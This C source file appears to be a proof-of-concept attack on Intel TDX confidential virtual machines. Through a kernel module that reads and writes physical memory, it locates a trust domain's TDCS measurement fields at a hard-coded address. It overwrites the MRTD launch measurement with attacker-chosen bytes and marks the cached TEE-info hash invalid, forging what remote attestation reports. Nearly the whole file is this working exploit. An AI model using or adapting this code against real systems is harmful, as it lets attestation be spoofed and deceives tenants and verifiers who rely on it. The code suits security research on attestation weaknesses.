#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <inttypes.h>

#include <sys/mman.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <fcntl.h>


#define _XOPEN_SOURCE 700
#include <fcntl.h>
#include <stdint.h>

#include "readalias.h"
#include "helpers.h"

#define PAGE_SHIFT 12
#define ALLOC_SIZE 1*PAGE_SIZE
#define CL_SIZE 64
#define SIZE_OF_SHA384_BLOCK_IN_QWORD 16
#define SIZE_OF_SHA384_BLOCK_IN_DWORD (SIZE_OF_SHA384_BLOCK_IN_QWORD<<1)
#define SIZE_OF_SHA384_BLOCK_IN_BYTES (SIZE_OF_SHA384_BLOCK_IN_DWORD<<2)
#define SIZE_OF_SHA384_STATE_IN_QWORD 8
#define SIZE_OF_SHA384_STATE_IN_DWORD (SIZE_OF_SHA384_STATE_IN_QWORD<<1)
#define SIZE_OF_SHA384_STATE_IN_BYTES (SIZE_OF_SHA384_STATE_IN_DWORD<<2)
#define SIZE_OF_SHA384_HASH_IN_QWORDS 6
#define SIZE_OF_SHA384_HASH_IN_BYTES (SIZE_OF_SHA384_HASH_IN_QWORDS << 3)
#define NUM_RTMRS          4
typedef uint8_t                  bool_t;
#define TDCS_MEASUREMEMNT_MRTD_CTX_SIZE         352

#define HASH_METHOD_BUFFER_SIZE       64
#define SIZE_OF_SHA384_CTX_BUFFER     256


typedef union td_param_attributes_s {
    struct
    {
        uint64_t debug           : 1;   // Bit 0
        uint64_t reserved_tud    : 3;   // Bits 3:1
        uint64_t reserved_tup    : 2;   // Bits 5:4
        uint64_t pmt_prof        : 1;   // Bits 6
        uint64_t reserved_tup2   : 9;   // Bits 15:7
        uint64_t icssd           : 1;   // Bit 16
        uint64_t reserved_p      : 6;   // Bits 22:17
        uint64_t reserved_n      : 4;   // Bits 26:23
        uint64_t lass            : 1;   // Bit 27
        uint64_t sept_ve_disable : 1;   // Bit 28 - disable #VE on pending page access
        uint64_t migratable      : 1;   // Bit 29
        uint64_t pks             : 1;   // Bit 30
        uint64_t kl              : 1;   // Bit 31
        uint64_t reserved_other  : 30;  // Bits 62:32
        uint64_t tpa             : 1;   // Bit 62
        uint64_t perfmon         : 1;   // Bit 63
    };
    uint64_t raw;
} td_param_attributes_t;

typedef union measurement_u
{
    uint64_t qwords[SIZE_OF_SHA384_HASH_IN_QWORDS];
    uint8_t  bytes[SIZE_OF_SHA384_HASH_IN_BYTES];
} measurement_t;

typedef union 
{
    struct
    {
        uint16_t exclusive :1;
        uint16_t host_prio :1;
        uint16_t counter   :14;
    };
    uint16_t raw;
} sharex_hp_lock_t;

/**
 * @struct sha384_ctx_t
 *
 * @brief Context of an incremental SHA384 process.
 */
typedef struct sha384_ctx_s
{
    uint64_t last_init_seamdb_index;
    uint8_t buffer[SIZE_OF_SHA384_CTX_BUFFER];
} sha384_ctx_t;

/**
 * @struct tdcs_measurement_fields_t
 *
 * @brief Holds TDCSs measurement fields
 */
typedef struct tdcs_measurement_fields_s
{
    measurement_t  mrtd; /**< Measurement of the initial contents of the TD */
    measurement_t  mrconfigid; /**< Software defined ID for additional configuration for the SW in the TD */
    measurement_t  mrowner; /**< Software defined ID for TD's owner */
    /**
     * Software defined ID for owner-defined configuration of the guest TD,
     * e.g., specific to the workload rather than the runtime or OS.
     */

    measurement_t  mrownerconfig; /**< Software defined ID for TD's owner */
    measurement_t  rtmr[NUM_RTMRS]; /**< Array of NUM_RTMRS runtime extendable measurement registers */

    measurement_t  last_teeinfo_hash;

    sharex_hp_lock_t rtmr_lock; /**< Controls concurrent access to the RTMR array */

    bool_t         last_teeinfo_hash_valid;

    uint8_t        reserved_0[45];
    /**
     * Holds the context of an incremental SHA384 calculation on this TD
     */
    sha384_ctx_t   td_sha_ctx;

    uint8_t        reserved_1[TDCS_MEASUREMEMNT_MRTD_CTX_SIZE - sizeof(sha384_ctx_t)];
} tdcs_measurement_fields_t;

typedef struct {
    uint64_t pfn : 55;
    unsigned int soft_dirty : 1;
    unsigned int file_page : 1;
    unsigned int swapped : 1;
    unsigned int present : 1;
} PagemapEntry;

/* Parse the pagemap entry for the given virtual address.
 *
 * @param[out] entry      the parsed entry
 * @param[in]  pagemap_fd file descriptor to an open /proc/pid/pagemap file
 * @param[in]  vaddr      virtual address to get entry for
 * @return 0 for success, 1 for failure
 */
int pagemap_get_entry(PagemapEntry *entry, int pagemap_fd, uintptr_t vaddr)
{
    size_t nread;
    ssize_t ret;
    uint64_t data;
    uintptr_t vpn;

    vpn = vaddr / sysconf(_SC_PAGE_SIZE);
    nread = 0;
    while (nread < sizeof(data)) {
        ret = pread(pagemap_fd, ((uint8_t*)&data) + nread, sizeof(data) - nread,
                vpn * sizeof(data) + nread);
        nread += ret;
        if (ret <= 0) {
            return 1;
        }
    }
    entry->pfn = data & (((uint64_t)1 << 55) - 1);
    entry->soft_dirty = (data >> 55) & 1;
    entry->file_page = (data >> 61) & 1;
    entry->swapped = (data >> 62) & 1;
    entry->present = (data >> 63) & 1;
    return 0;
}


int virt_to_phys_user(uintptr_t *paddr, pid_t pid, uintptr_t vaddr)
{
    char pagemap_file[BUFSIZ];
    int pagemap_fd;

    snprintf(pagemap_file, sizeof(pagemap_file), "/proc/%ju/pagemap", (uintmax_t)pid);
    pagemap_fd = open(pagemap_file, O_RDONLY);
    if (pagemap_fd < 0) {
        close(pagemap_fd);
        return 1;
    }
    PagemapEntry entry;
    if (pagemap_get_entry(&entry, pagemap_fd, vaddr)) {
        close(pagemap_fd);
        return 1;
    }
    if( entry.pfn == 0) {
        printf("%s:%d entry.pfn == 0 for pid=%d, vaddr=0x%jx, are we root?\n",__FILE__,__LINE__, pid, vaddr);
        close(pagemap_fd);
        return 1;
    }
    close(pagemap_fd);
    *paddr = (entry.pfn * sysconf(_SC_PAGE_SIZE)) + (vaddr % sysconf(_SC_PAGE_SIZE));




    return 0;
}

typedef struct
{
    char *name;
    uint64_t vaddr;
} code_gadget_t;

void hexdump(uint8_t* a, const size_t n)
{
	for(size_t i = 0; i < n; i++) {
    printf("%02x", a[i]);
  }
	printf("\n");
}

void fill_uint64(uint64_t *dest, uint64_t value, size_t count) {
    for (size_t i = 0; i < count; i++) {
        dest[i] = value;
    }
}

int main(int argc, char **argv)
{
    (void)argc;
    (void)argv;
    unsigned char* buf = NULL;
    buf = (unsigned char*)malloc(ALLOC_SIZE);
    if (!buf) goto error;
    page_stats_t stats;

    if (open_kmod()) {
        printf("Unable to open the kernel module (are you root?)\n");
        goto error;
    }

  char *hex_input = NULL;
  size_t hex_len;
  size_t byte_len = 0;
  if (argc == 2) { 
    hex_input = argv[1];
    hex_len = strlen(hex_input);
    // Ensure we don't exceed 48 bytes (96 hex chars)
    byte_len = hex_len / 2;
    if (byte_len > 48) byte_len = 48;
  }

  // Initialize buffer with zeros
  memset(buf, 0, 48);

    // TODO: Set to correct TDCS PA
    uint64_t tdcs_pa = 0x1555000240;
    tdcs_measurement_fields_t measurement;
    printf("Size of measurement: %ld\n", sizeof(tdcs_measurement_fields_t));
    (void)measurement;

    // Now read this data from the memory location
    memset(buf, 0, ALLOC_SIZE);
    if( memcpy_frompa((uint8_t*)&measurement, tdcs_pa, sizeof(tdcs_measurement_fields_t), &stats, true) ) {
        goto error;
    }

    printf("Original MRTD:         ");
    hexdump((unsigned char*)&(measurement.mrtd.bytes), 48);
    hexdump((unsigned char*)&(measurement.last_teeinfo_hash_valid), 1);
    


    if (argc < 2) {
    memset(buf, 0x42, 48);


    printf("Changing MRTD to 0x42: ");
    hexdump(buf, 48);
    } else {
  

  for (size_t i = 0; i < byte_len; i++) {
    // Read 2 hex characters and store as 1 byte
    sscanf(&hex_input[i * 2], "%02hhx", &buf[i]);
  }
  printf("Changing MRTD to:      ");
  // Verification: Print the first few bytes in hex
  hexdump(buf, 48);
}


    memcpy(&(measurement.mrtd.bytes), buf, 48);
    printf("Setting `last_teeinfo_hash_valid` to false\n");
    measurement.last_teeinfo_hash_valid = 0;

    if( memcpy_topa(tdcs_pa, &(measurement.mrtd.bytes), sizeof(tdcs_measurement_fields_t), &stats, true) ) {
        goto error;
    }


    goto cleanup;
error:
    printf("Error -- ");
cleanup:
    if (buf) free(buf);
    close_kmod();
}
